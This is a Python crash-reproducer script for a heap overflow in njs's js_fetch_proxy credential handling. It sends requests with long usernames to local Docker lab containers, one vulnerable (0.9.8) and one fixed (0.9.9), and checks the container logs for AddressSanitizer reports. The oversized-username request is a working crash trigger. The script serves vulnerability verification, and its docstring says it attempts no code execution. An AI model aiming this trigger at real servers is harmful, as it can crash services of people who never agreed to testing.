#!/usr/bin/env python3
"""ASAN repro for the njs js_fetch_proxy credential overflow.

This is a defensive crash reproducer.  It sends normal HTTP requests to a lab
configuration where js_fetch_proxy is built from request variables, then checks
container logs for sanitizer evidence.  It does not attempt code execution or
ASLR bypass.
"""

from __future__ import annotations

import argparse
import http.client
import re
import subprocess
import sys
import time
import urllib.parse
from dataclasses import dataclass


ASAN_RE = re.compile(
    rb"(AddressSanitizer|ERROR: AddressSanitizer|heap-buffer-overflow|"
    rb"use-after-free|stack-buffer-overflow|SEGV)"
)
STATUS_RE = re.compile(rb"HTTP/1\.[01] ([0-9]{3})")


@dataclass
class Result:
    length: int
    status: int | None
    bytes_read: int
    note: str


def parse_target(value: str, fallback_port: int) -> tuple[str, int]:
    if "://" in value:
        parsed = urllib.parse.urlparse(value)
        return parsed.hostname or "127.0.0.1", parsed.port or fallback_port
    if ":" in value.rsplit("@", 1)[-1]:
        host, port = value.rsplit(":", 1)
        return host, int(port)
    return value, fallback_port


def docker_logs(container: str | None) -> bytes:
    if not container:
        return b""
    try:
        proc = subprocess.run(
            ["docker", "logs", container],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            check=False,
        )
    except OSError:
        return b""
    return proc.stdout


def log_delta(before: bytes, after: bytes) -> bytes:
    if before and after.startswith(before):
        return after[len(before) :]
    return after


def request_once(host: str, port: int, user_len: int, timeout: float) -> Result:
    username = "A" * user_len
    path = "/dynamic_proxy?" + urllib.parse.urlencode({"u": username, "p": "p"})
    conn = http.client.HTTPConnection(host, port, timeout=timeout)

    try:
        conn.request("GET", path, headers={"Connection": "close"})
        resp = conn.getresponse()
        body = resp.read()
        return Result(user_len, resp.status, len(body), "ok")

    except Exception as exc:  # connection reset is expected on ASAN aborts
        return Result(user_len, None, 0, f"{type(exc).__name__}: {exc}")

    finally:
        try:
            conn.close()
        except Exception:
            pass


def health(host: str, port: int, timeout: float) -> bool:
    conn = http.client.HTTPConnection(host, port, timeout=timeout)
    try:
        conn.request("GET", "/", headers={"Connection": "close"})
        resp = conn.getresponse()
        body = resp.read()
        return resp.status == 200 and b"njs fetch proxy lab ok" in body
    except Exception:
        return False
    finally:
        try:
            conn.close()
        except Exception:
            pass


def run_case(label: str, target: str, port: int, container: str | None, lengths: list[int], timeout: float) -> bool:
    host, resolved_port = parse_target(target, port)
    print(f"[{label}] target={host}:{resolved_port} container={container or '-'}")

    if not health(host, resolved_port, timeout):
        print(f"[{label}] preflight=failed")
        return False

    before = docker_logs(container)
    for length in lengths:
        result = request_once(host, resolved_port, length, timeout)
        status = result.status if result.status is not None else "-"
        print(
            f"[{label}] user_len={result.length:<4} "
            f"status={status!s:<3} bytes={result.bytes_read:<5} note={result.note}"
        )
        time.sleep(0.25)

    # Give the NGINX master a short window to reap and respawn an ASAN-aborted worker.
    deadline = time.time() + 4.0
    while time.time() < deadline and not health(host, resolved_port, timeout):
        time.sleep(0.2)

    after = docker_logs(container)
    delta = log_delta(before, after)
    asan_hit = bool(ASAN_RE.search(delta))
    print(f"[{label}] sanitizer_delta_bytes={len(delta)} asan_hit={asan_hit}")
    print(f"[{label}] post_health={'up' if health(host, resolved_port, timeout) else 'down'}")

    return asan_hit


def parse_lengths(value: str) -> list[int]:
    out = []
    for part in value.split(","):
        part = part.strip()
        if part:
            out.append(int(part, 10))
    return out


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Reproduce the njs js_fetch_proxy credential heap overflow with ASAN evidence."
    )
    parser.add_argument("--vuln-target", default="127.0.0.1:19411", help="vulnerable HOST:PORT or URL")
    parser.add_argument("--vuln-container", default="njs-fetch-proxy-098-asan", help="vulnerable Docker container name")
    parser.add_argument("--fixed-target", default="127.0.0.1:19421", help="fixed HOST:PORT or URL")
    parser.add_argument("--fixed-container", default="njs-fetch-proxy-099-asan", help="fixed Docker container name")
    parser.add_argument("--port", type=int, default=19411, help="fallback port when target omits one")
    parser.add_argument("--lengths", default="127,128,129,160,200", help="comma-separated username lengths to test")
    parser.add_argument("--timeout", type=float, default=4.0)
    parser.add_argument("--skip-fixed", action="store_true", help="only test the vulnerable target")
    args = parser.parse_args()

    if hasattr(sys.stdout, "reconfigure"):
        sys.stdout.reconfigure(line_buffering=True)

    lengths = parse_lengths(args.lengths)
    print("scope=njs js_fetch_proxy dynamic proxy URL credentials")
    print("expectation=vulnerable njs 0.9.8 shows ASAN; fixed njs 0.9.9 stays clean")

    vuln_hit = run_case(
        "vuln",
        args.vuln_target,
        args.port,
        args.vuln_container,
        lengths,
        args.timeout,
    )

    fixed_hit = False
    if not args.skip_fixed:
        fixed_hit = run_case(
            "fixed",
            args.fixed_target,
            args.port,
            args.fixed_container,
            lengths,
            args.timeout,
        )

    print(f"summary vuln_asan={vuln_hit} fixed_asan={fixed_hit}")

    if not vuln_hit:
        return 1
    if fixed_hit:
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
